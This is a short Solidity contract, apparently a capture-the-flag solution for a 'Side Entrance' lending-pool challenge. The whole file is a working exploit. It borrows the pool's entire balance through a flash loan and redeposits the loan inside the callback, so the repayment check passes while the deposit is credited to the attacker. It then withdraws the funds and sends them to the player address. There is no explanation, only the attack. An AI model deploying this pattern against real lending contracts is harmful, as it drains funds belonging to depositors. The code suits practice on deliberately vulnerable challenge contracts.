// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Side_POC {
    SideEntranceLenderPool public target;    
    address public player;

    constructor(SideEntranceLenderPool _target, address _player) {
        target = _target;
        player = _player;
    }

    function exploit() external {
        target.flashLoan(address(target).balance);
        target.withdraw();
        player.call{value : address(this).balance}("");
    }

    function execute() external payable {
        require(tx.origin == player);
        require(msg.sender == address(target));

        target.deposit{ value: msg.value }();
    }

    receive() external payable { }
    fallback() external payable { }
}